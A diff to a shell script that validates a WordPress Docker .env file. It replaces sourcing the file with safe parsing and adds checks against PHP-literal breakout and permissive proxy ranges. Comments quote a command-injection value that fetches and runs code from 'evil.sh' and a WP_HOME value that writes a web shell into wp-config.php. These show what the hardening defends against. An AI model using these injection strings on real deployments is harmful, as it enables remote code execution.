@@ -11,12 +11,17 @@
 #    - memory relationships (WP_MEMORY_LIMIT <= php.ini memory_limit,
 #      REDIS_MAXMEMORY < REDIS_MEM_LIMIT,
 #      innodb_buffer_pool_size < DB_MEM_LIMIT)
+#    - characters that would break out of wp-config.php's PHP literals
 #    - WORDPRESS_LOCAL_PORT free on the host (multi-site collisions)
 #    - the external PROXY_NETWORK actually existing (if docker is present)
 #
 #  Usage:  ./verify.sh            (checks ./.env)
 #          ./verify.sh path/.env
 #  Exits non-zero if any ERROR is found (WARNINGS don't fail the run).
+#
+#  VERIFY_SKIP_ENV_CHECKS=1 skips the two probes that inspect the machine
+#  (host port in use, docker network present) so the checks that are purely
+#  about file contents can be tested hermetically — see ci/test-verify.sh.
 # ---------------------------------------------------------------------
 set -eu
 
@@ -35,16 +40,50 @@ fi
 
 echo "Validating ${ENV_FILE} ..."
 
-# Load the env file (it's the user's own file). set -a exports each var.
-# Prefix a bare filename with ./ so `.` doesn't search PATH for it.
-set -a
-case "${ENV_FILE}" in
-    */*) ENV_SRC="${ENV_FILE}" ;;
-    *)   ENV_SRC="./${ENV_FILE}" ;;
-esac
-# shellcheck disable=SC1090
-. "${ENV_SRC}"
-set +a
+# --- load the env file ----------------------------------------------
+# PARSED, never sourced. `. .env` runs the file as a shell script, so a value
+# like  MYSQL_PASSWORD=x$(curl evil.sh|sh)  executes on validation — and this
+# script gets pointed at .env files that arrive from a colleague, a repo, or a
+# paste. Docker Compose does not evaluate anything in .env, so sourcing made
+# *checking* a config strictly more dangerous than deploying it.
+#
+# Accept only KEY=VALUE with a shell-safe KEY, strip one layer of matching
+# quotes (Compose does the same), ignore comments and blank lines. Values are
+# assigned via `eval` with the value single-quoted and any embedded single
+# quote escaped, so no substitution can happen.
+while IFS= read -r line || [ -n "${line}" ]; do
+    case "${line}" in
+        ''|'#'*) continue ;;
+    esac
+    # Tolerate `export FOO=bar`.
+    case "${line}" in
+        'export '*) line="${line#export }" ;;
+    esac
+    key="${line%%=*}"
+    val="${line#*=}"
+    # No '=' on the line, or a key that isn't a plain identifier: skip it.
+    case "${line}" in *=*) : ;; *) continue ;; esac
+    printf '%s' "${key}" | grep -Eq '^[A-Za-z_][A-Za-z0-9_]*$' || continue
+    # Match Compose's own dotenv handling: a quoted value keeps its contents
+    # verbatim (minus the quotes); an unquoted value ends at a whitespace-
+    # preceded '#', which Compose treats as an inline comment. Without the
+    # latter, `DISALLOW_FILE_MODS=false # frozen` would be read here as
+    # "false # frozen" and rejected, while Compose would happily see "false".
+    case "${val}" in
+        \"*\") val="${val#\"}"; val="${val%\"}" ;;
+        \'*\') val="${val#\'}"; val="${val%\'}" ;;
+        *)
+            case "${val}" in
+                *[[:space:]]\#*) val="${val%%[[:space:]]#*}" ;;
+            esac
+            # Trim trailing whitespace left by the value or the comment.
+            val="$(printf '%s' "${val}" | sed 's/[[:space:]]*$//')"
+            ;;
+    esac
+    # Escape single quotes for the single-quoted assignment below.
+    esc="$(printf '%s' "${val}" | sed "s/'/'\\\\''/g")"
+    eval "${key}='${esc}'"
+done < "${ENV_FILE}"
 
 # --- helpers --------------------------------------------------------
 # Normalise a memory size (1024M, 2g, 512mb, 640m) to bytes for comparison.
@@ -98,6 +137,34 @@ for v in MYSQL_PASSWORD MYSQL_ROOT_PASSWORD REDIS_PASSWORD; do
         err "${v} is only ${#val} chars — use at least ${MIN_SECRET_LEN} (openssl rand -base64 24)"
     fi
 done
+
+# --- characters that escape wp-config.php's PHP literals ------------
+# docker-compose.yml builds WORDPRESS_CONFIG_EXTRA by interpolating these
+# values INSIDE single-quoted PHP literals:
+#     define('WP_HOME', '${WP_HOME}');
+# so a value containing a single quote closes the literal and the rest of the
+# line becomes executable PHP. For example
+#     WP_HOME=https://site.tld'); system($_GET[0]); //
+# produces a working web shell in wp-config.php, on a volume, surviving
+# rebuilds. Backslashes can escape the closing quote to the same effect, and
+# a newline or $ leads to broken or surprising config.
+#
+# Nothing downstream catches this: Compose interpolates blindly, and the
+# documented Portainer flow sets these in a UI that never runs this script.
+# So treat it as fatal here, and keep the generated values boring.
+echo "wp-config.php safety:"
+php_literal_unsafe=0
+for v in WP_HOME WP_SITEURL REDIS_PASSWORD STACK_NAME WP_MEMORY_LIMIT \
+         WP_MAX_MEMORY_LIMIT WP_ENVIRONMENT_TYPE WORDPRESS_TABLE_PREFIX; do
+    eval "val=\${$v:-}"
+    [ -n "${val}" ] || continue
+    # tr -d then compare: a POSIX-portable "contains any of these chars".
+    if [ "$(printf '%s' "${val}" | tr -d "'\\\\\$\`\"" )" != "${val}" ]; then
+        err "${v} contains one of ' \" \\ \$ \` — these break out of the PHP string in wp-config.php (potential code execution)"
+        php_literal_unsafe=1
+    fi
+done
+[ "${php_literal_unsafe}" -eq 0 ] && ok "no quote/backslash/\$ in values written into wp-config.php"
 
 # --- placeholder site identity -------------------------------------
 # Not fatal for DOMAIN (it is documentation), fatal for the URLs WordPress
@@ -243,6 +310,8 @@ port="${WORDPRESS_LOCAL_PORT:-}"
 bind="${WP_HTTP_BIND:-127.0.0.1}"
 if ! printf '%s' "${port}" | grep -Eq '^[0-9]+$' || [ "${port}" -lt 1 ] || [ "${port}" -gt 65535 ]; then
     err "WORDPRESS_LOCAL_PORT='${port}' must be an integer 1-65535"
+elif [ "${VERIFY_SKIP_ENV_CHECKS:-0}" = "1" ]; then
+    ok "port ${port} is a valid number (availability check skipped)"
 else
     in_use=""
     if command -v lsof >/dev/null 2>&1; then
@@ -263,9 +332,25 @@ else
     fi
 fi
 
+# --- trusted proxy CIDRs -------------------------------------------
+# mod_remoteip lets these ranges set the real client IP via X-Forwarded-For.
+# The shipped default trusts every RFC1918 range, which on a shared edge-proxy
+# network means ANY other container there can forge a client IP — defeating
+# per-IP rate limiting and blocking (Wordfence, limit-login plugins, fail2ban)
+# and poisoning access logs.
+echo "Trusted proxy:"
+default_cidrs="10.0.0.0/8 172.16.0.0/12 192.168.0.0/16"
+if [ "${TRUSTED_PROXY_CIDRS:-${default_cidrs}}" = "${default_cidrs}" ]; then
+    warn "TRUSTED_PROXY_CIDRS is the permissive default — narrow it to your edge proxy's subnet so neighbouring containers can't spoof X-Forwarded-For"
+else
+    ok "TRUSTED_PROXY_CIDRS narrowed to '${TRUSTED_PROXY_CIDRS}'"
+fi
+
 # --- external proxy network (needs docker) -------------------------
 echo "Proxy network:"
-if command -v docker >/dev/null 2>&1; then
+if [ "${VERIFY_SKIP_ENV_CHECKS:-0}" = "1" ]; then
+    ok "proxy network check skipped (VERIFY_SKIP_ENV_CHECKS=1)"
+elif command -v docker >/dev/null 2>&1; then
     if docker network inspect "${PROXY_NETWORK}" >/dev/null 2>&1; then
         ok "external network '${PROXY_NETWORK}' exists"
     else
